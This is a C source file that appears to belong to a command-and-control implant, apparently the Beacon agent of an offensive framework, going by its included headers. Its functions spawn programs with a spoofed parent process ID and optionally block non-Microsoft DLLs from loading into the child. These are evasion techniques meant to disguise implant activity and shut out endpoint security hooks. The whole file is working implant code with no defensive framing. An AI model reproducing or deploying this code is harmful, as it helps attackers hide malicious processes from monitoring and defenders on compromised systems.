/*
* Functions related to (cleanly) managing extended attributes for programs we run.
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"

#include "process.h"

extern BOOL blockdlls;

/* cleanup our attribute list */
void attr_cleanup(void * ptr) {
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)ptr;

	/* cleanup this thing */
	DeleteProcThreadAttributeList(pAttributeList);
	HeapFree(GetProcessHeap(), 0, pAttributeList);
}

/* initialize our attribute list */
void * attr_init(DWORD count) {
	SIZE_T                      cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;

	/* allocate our attributes */
	InitializeProcThreadAttributeList(NULL, count, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);

	/* initialize our attributes */
	if (pAttributeList == NULL || !InitializeProcThreadAttributeList(pAttributeList, count, 0, &cbAttributeListSize))
		return NULL;

	return pAttributeList;
}

int count_proc_attributes(int ppid) {
	if (ppid == 0 && blockdlls == FALSE)
		return 0;
	else if (ppid != 0 && blockdlls == TRUE)
		return 2;
	else
		return 1;
}

/* helper to execute the specified program with an arbitrary PPID value */
BOOL _execute_program_with_ppid(PROCESS_CONTEXT * ctx, int ppid) {
	STARTUPINFOEX               si_ex;
	BOOL                        result = FALSE;
	void *                      attrs;
	int                         count;
	EX_ATTR_MOD                 mod_ppid;
	EX_ATTR_MOD                 mod_blockdlls;

	/* how many attribute modifications do we have? */
	count = count_proc_attributes(ppid);

	/* default behavior when we have no attributes to modify */
	if (count == 0)
		return execute_program(ctx);

	/* initialize our attributes */
	attrs = attr_init(count);

	/* initialize our functions */
	mod_ppid      = process_ppid();
	mod_blockdlls = process_blockdlls();

	/* walk our attribute modifications */
	if (ppid != 0)
		if (!mod_ppid.pre(&mod_ppid, ppid, attrs, ctx->si))
			goto cleanup;

	if (blockdlls == TRUE)
		if (!mod_blockdlls.pre(&mod_blockdlls, ppid, attrs, ctx->si))
			goto cleanup;

	/* setup our values to use an extended startup info */
	si_ex.StartupInfo     = *ctx->si;
	si_ex.StartupInfo.cb  = sizeof(STARTUPINFOEX);
	si_ex.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)attrs;

	/* update context to point to si_ex */
	ctx->si               = (STARTUPINFO *)&si_ex;
	ctx->flags            = ctx->flags | EXTENDED_STARTUPINFO_PRESENT;

	/* run the program yo */
	result = execute_program(ctx);

	/* walk our attribute modifications and do cleanup */
	if (ppid != 0)
		mod_ppid.post(&mod_ppid);

	if (blockdlls == TRUE)
		mod_blockdlls.post(&mod_blockdlls);

cleanup:
	/* clean up our attributes list */
	attr_cleanup(attrs);

	/* return our result (should be false if there was an error) */
	return result;
}

BOOL execute_program_with_ppid(char * cbuffer, int clen, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD flags, BOOL ignoreToken, int ppid) {
	PROCESS_CONTEXT context;
	memset(&context, 0, sizeof(PROCESS_CONTEXT));

	context.cbuffer     = cbuffer;
	context.clen        = clen;
	context.si          = si;
	context.pi          = pi;
	context.flags       = flags;
	context.ignoreToken = ignoreToken;

	return _execute_program_with_ppid(&context, ppid);
}